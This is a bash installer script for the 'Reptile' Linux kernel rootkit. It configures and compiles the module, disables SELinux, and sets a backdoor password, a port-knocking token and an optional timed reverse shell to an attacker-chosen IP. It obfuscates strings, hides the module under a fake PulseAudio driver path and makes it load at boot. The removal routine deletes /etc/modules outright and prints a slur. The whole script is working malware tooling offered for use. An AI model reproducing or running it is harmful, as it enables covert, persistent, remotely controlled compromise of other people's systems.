#!/bin/bash
#
# Reptile Install Script
# Author: F0rb1dd3n

DRIVER="PulseAudio"
KERNEL_VERSION=$(uname -r)
PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"

function banner {
	echo -e "\n\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;31m############################ \e[01;36mREPTILE INSTALLER\e[00;31m #############################\e[00m"
	echo -e "\e[00;31m############################################################################\e[00m"
	echo -e "\e[00;36mwritten by: F0rb1dd3n\e[00m"
}

function usage {
	banner
	echo -e "\nUsage: $0 <arg>\n"
	echo -e "\tinstall\t\tCompile and install the module persistently"
	echo -e "\tremove\t\tRemove the persistence of module\n"
}

function load_config {
	RETVAL=""

	if [ -z $2 ]; then
		ROTULE="$1: "
	else
		ROTULE="$1 (default: $2): "
	fi

	read -p "$ROTULE"
	if [ -z $REPLY ]; then
		RETVAL=$2
	else
		RETVAL=$REPLY
	fi
}

#
# This obfuscation idea was suggested by: Ilya V. Matveychikov a.k.a milabs
# 

function string_obfuscate {
	n=0
	VAR=""
	RETVAL="" 

	for i in $(echo -ne "$1" | hexdump -ve '"%08x\n"'); do
		VAR+=" p[$n] = 0x$i; \\
"
		((n++))	
	done

	RETVAL+="\\
({ \\
unsigned int *p = (unsigned int*)__builtin_alloca( $n * 4 ); \\
$VAR (char *)p; \\
})
"
}

function directory_remove {
	read -p "Would you like to remove this directory ($PWD) on exit? (Y/N) [default: N]: "
	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
        	echo -n "Removing $PWD... "
        	rm -rf $PWD && echo -e "\e[01;36mDONE!\e[00m" || echo -e "\e[01;31mERROR!\e[00m"
	elif [ "$REPLY" == "N" ] || [ "$REPLY" == "n" ] || [ -z $REPLY ]; then
        	echo -e "Not removing $PWD"
	else
        	echo -e "Invalid option. Not removing $PWD"
	fi
}

function reptile_init {
	banner

	[ $(uname) != "Linux" ] && {
		echo "Not on a Linux system. Exiting..."
		exit
	}

	[ $(id -u) != 0 ] && {
		echo "Not root. Exiting..."
		exit
	}

	if [ -f /etc/selinux/config ]; then
        	echo -ne "SELinux config found on system!\nChecking SELinux status... "
        	if [[ $(cat /etc/selinux/config | grep "SELINUX=" | tail -n 1) == *"enforcing"* ]]; then
                	echo -ne "\e[01;31menforcing\e[00m\n"
                	echo -n "Trying to set enforce permissive... "
                	setenforce 0
                	if [ "$(getenforce)" == "Permissive" ]; then
                        	echo -e "\e[01;36mDONE!\e[00m"
                	else
                        	echo -e "\e[01;31mERROR!\e[00m"
                	fi
                	echo -n "Trying to disable SELinux... "
                	sed -i "s:SELINUX=enforcing:SELINUX=disabled:" /etc/selinux/config || {
                        	echo -e "\e[01;31mERROR!\e[00m\n"
                        	#exit
                	}
                	echo -e "\e[01;36mDONE!\e[00m"
                	echo -e "\e[01;33mMaybe you will need to reboot!\e[00m"
        	else
                	echo -e "\e[01;36mclear\e[00m"
        	fi
	fi      

	[ ! -e /proc ] && {
        	echo -e "\nWe're in a horrible jail as /proc doesn't exist. Exiting..."
        	exit
	}

    	for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
       	do 
            	SYSTEM=${f:5:${#f}-13}
    	done

    	if [ "$SYSTEM" == "" ]; then
        	#TODO: error message
        	exit
    	fi
	
	echo
	load_config "Hide name (will be used to hide dirs/files)" "reptile"
	MODULE=$RETVAL
	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"

	load_config "Auth token to port-knocking" "hax0r"
	TOKEN=$RETVAL
	
	load_config "Backdoor password" "s3cr3t"
	PASS=$RETVAL
	
	load_config "Tag name that hide file contents" "reptile"
	TAG=$RETVAL
	
	load_config "Source port to port-knocking" "666"
	SRCPORT=$RETVAL
	
	load_config "TCP port to port-knocking" "80"
	TCPPORT=$RETVAL
	
	load_config "UPD port to port-knocking" "53"
	UDPPORT=$RETVAL

	load_config "Would you like to config reverse shell each X time? (y/n)" "n"
	RSH=$RETVAL	

	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
		load_config "Reverse IP"
		LHOST=$RETVAL
		
		load_config "Reverse Port" "80"
		LPORT=$RETVAL

		load_config "How long is your interval? (in seconds)" "1800"
		INTERVAL=$RETVAL
	fi

	echo -e "\nHide name: \e[01;36m$MODULE\e[00m"
	echo -e "Token: \e[01;36m$TOKEN\e[00m"
	echo -e "Backdoor password: \e[01;36m$PASS\e[00m"
	echo -e "SRC port: \e[01;36m$SRCPORT\e[00m"
	echo -e "TCP port: \e[01;36m$TCPPORT\e[00m"
	echo -e "UDP port: \e[01;36m$UDPPORT\e[00m"
	
	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
		echo -e "\nReverse shell each X time:"
		echo -e "Reverse IP: \e[01;36m$LHOST\e[00m"
		echo -e "Reverse Port: \e[01;36m$LPORT\e[00m"
		echo -e "Interval: \e[01;36m$INTERVAL\e[00m"
	fi
	
	echo -e "\nTAGs to hide file contents: \n\n\e[01;36m#<$TAG>\n\e[00mcontent to be hidden\n\e[01;36m#</$TAG>\e[00m\n"
}

function config_gen {
	string_obfuscate $MODULE
	MODULESTR=$RETVAL

	_SHELL="/"$MODULE"/"$MODULE"_shell"
	
	cat > scripts/start.sh <<EOF
#!/bin/bash

#<$TAG>

kill -50 0
EOF

	if [ "$RSH" == "y" ] || [ "$RSH" == "Y" ]; then
		cat >> scripts/start.sh <<EOF	
$_SHELL -t $LHOST -p $LPORT -r $INTERVAL
EOF
	fi

	cat >> scripts/start.sh <<EOF
kill -49 \`ps -ef | grep $MODULE | grep -v grep | awk '{print $2}'\`

#</$TAG>
EOF
	
	string_obfuscate $TOKEN
	TOKEN=$RETVAL
	
	string_obfuscate $PASS
	PASS=$RETVAL
	
	string_obfuscate $_SHELL
	_SHELL=$RETVAL
	
	START="/"$MODULE"/"$MODULE"_start.sh"
	string_obfuscate $START
	START=$RETVAL
	
	TAGIN="#<$TAG>"
	string_obfuscate $TAGIN
	TAGIN=$RETVAL

	TAGOUT="#</$TAG>"
	string_obfuscate $TAGOUT
	TAGOUT=$RETVAL

	HOMEDIR="/"$MODULE
	string_obfuscate $HOMEDIR
	HOMEDIR=$RETVAL
	
	RCFILE="/"$MODULE"/"$MODULE"_rc"
	string_obfuscate $RCFILE
	RCFILE=$RETVAL

	cat > sbin/config.h <<EOF
#ifndef _CONFIG_H
#define _CONFIG_H

#define TOKEN 		$TOKEN
#define PASS 		$PASS
#define SHELL 		$_SHELL
#define START 		$START
#define HIDE 		$MODULESTR
#define HIDETAGIN 	$TAGIN
#define HIDETAGOUT 	$TAGOUT
#define SRCPORT 	$SRCPORT
#define TCPPORT 	$TCPPORT
#define UDPPORT 	$UDPPORT
#define HOMEDIR 	$HOMEDIR
#define RCFILE 		$RCFILE
#define ERROR		-1
#define GET_FILE	 1
#define PUT_FILE	 2
#define RUNSHELL	 3

#endif
EOF
}

function reptile_install {
	reptile_init
	
	echo -ne "Configuring... "
	if [ ! -d $DRIVER_DIRECTORY ]; then
        	mkdir -p $DRIVER_DIRECTORY
    	fi

	config_gen && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	
	echo -ne "Compiling... "
	make all > /dev/null 2>&1 && \
	make clean > /dev/null 2>&1 && \
	mv bin/rep_mod bin/$MODULE.ko > /dev/null 2>&1 && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	echo -n "Copying files to /$MODULE... "
	mkdir -p /$MODULE && \
	cp bin/$MODULE* /$MODULE && \
	cp bin/shell /$MODULE/$MODULE"_shell" && \
	cp bin/client /$MODULE/$MODULE"_client" && \
	cp bin/r00t /$MODULE/$MODULE"_r00t" && \
	cp scripts/start.sh /$MODULE/$MODULE"_start.sh" && \
	cp scripts/bashrc /$MODULE/$MODULE"_rc" && \
	rm -rf bin && \
	rm -f scripts/start.sh && \
	echo -e "\e[01;36mDONE!\e[00m" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	
	echo -ne "Installing... "
    
	cp "/$MODULE/$MODULE.ko" "$DRIVER_DIRECTORY" 2> /dev/null || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    
    	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
        	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
        	echo -ne "#<$TAG>\nmodprobe $MODULE\n#</$TAG>" >> /etc/rc.modules && \
		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	#elif [ "$SYSTEM" == "arch" ]; then
        #	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
    	fi
    	
	depmod && insmod /$MODULE/$MODULE.ko && \
	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }

	directory_remove
	echo -e "\nInstalation has finished!\n"
}

function reptile_remove {
	banner

	echo	
	load_config "Hide name" "reptile"
	MODULE=$RETVAL
	DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/drivers/$DRIVER/$MODULE"
	
	if [ ! -d "/$MODULE" ]; then
	       echo -e "Reptile seems to be uninstalled!\n"	
	       exit
	fi

	echo -e "\n\e[01;31mYou are gay!\e[00m"
	echo -ne "Uninstalling... "

	if [ -z $(lsmod | grep rep_mod | cut -d " " -f 1) ]; then
		kill -50 '0' && rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	else	
		rmmod rep_mod || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	fi

	rm -rf /$MODULE && \
	rm -rf $DRIVER_DIRECTORY && \
	rm -rf /etc/rc.modules && \
	rm -rf /etc/modules && \
	depmod && echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
	
	directory_remove
	echo
}

case $1 in
    	install)
        	reptile_install
        	;;
    	remove)
        	reptile_remove
        	;;
	"")
		usage
		;;
esac
